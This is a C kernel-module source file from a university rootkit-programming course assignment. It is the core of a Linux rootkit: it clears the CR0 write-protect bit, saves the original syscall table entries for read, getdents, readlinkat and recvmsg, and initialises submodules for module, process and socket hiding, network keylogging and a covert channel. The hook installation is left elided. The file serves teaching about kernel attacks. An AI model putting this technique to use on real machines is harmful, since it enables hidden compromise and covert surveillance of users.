
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: core.c                                                          */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage: ...                                                                */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_read */
#include <linux/list.h>			/* Needed for linked list interface */

#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
#include "module_masking.h"		/* Needed for ... */
#include "network_keylogging.h"	/* Needed for ... */
#include "process_masking.h"	/* Needed for ... */
#include "socket_masking.h"		/* Needed for ... */
#include "covert_channel.h"		/* Needed for ... */


MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A rootkit :)");
MODULE_VERSION("0.1");
MODULE_AUTHOR("Matei<mateipavaluca@yahoo.com>");
MODULE_AUTHOR("Nedko<nedko.stefanov.nedkov@gmail.com>");


/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define DEBUG_MODE_IS_ON 1
#define CR0_WRITE_PROTECT_MASK (1 << 16)
#define PRINT(str) printk(KERN_INFO "rootkit core: %s\n", (str))
#define DEBUG_PRINT(str) if (DEBUG_MODE_IS_ON) PRINT(str)


/* Definition of global variables */
static void **syscall_table;
asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
asmlinkage int (*original_getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int);
asmlinkage long (*original_readlinkat_syscall)(int , const char __user *, char __user *, int);
asmlinkage ssize_t (*original_recvmsg_syscall)(int, struct user_msghdr __user *, unsigned);


/* Declaration of functions */
static void disable_write_protect_mode(void);
static void enable_write_protect_mode(void);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces ... */
static int __init core_start(void)
{
	disable_write_protect_mode();

	/* Store original syscall addresses */
	syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	original_read_syscall = (void *) syscall_table[__NR_read];
	original_getdents_syscall = (void *) syscall_table[__NR_getdents];
	original_readlinkat_syscall = (void *) syscall_table[__NR_readlinkat];
	original_recvmsg_syscall = (void *) syscall_table[__NR_recvmsg];

	/* Overwrite manipulated syscall */
	//...

	enable_write_protect_mode();

	//TODO: check return values
	module_masking_init(DEBUG_MODE_IS_ON);
	network_keylogging_init(DEBUG_MODE_IS_ON);
	process_masking_init(DEBUG_MODE_IS_ON);
	socket_masking_init(DEBUG_MODE_IS_ON);
	covert_channel_init(DEBUG_MODE_IS_ON);

	DEBUG_PRINT("successfully inserted");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original read() syscall. */
static void __exit core_end(void)
{
	disable_write_protect_mode();

	/* Restore original read syscall */
	syscall_table[__NR_read] = (unsigned long *) original_read_syscall;
	syscall_table[__NR_getdents] = (unsigned long *) original_getdents_syscall;
	syscall_table[__NR_readlinkat] = (unsigned long *) original_readlinkat_syscall;
	syscall_table[__NR_recvmsg] = (unsigned long *) original_recvmsg_syscall;

	enable_write_protect_mode();

	covert_channel_exit();
	socket_masking_exit();
	process_masking_exit();
	network_keylogging_exit();
	module_masking_exit();

	DEBUG_PRINT("successfully removed");

	return;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
}


void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | CR0_WRITE_PROTECT_MASK);
}


module_init(core_start);
module_exit(core_end);
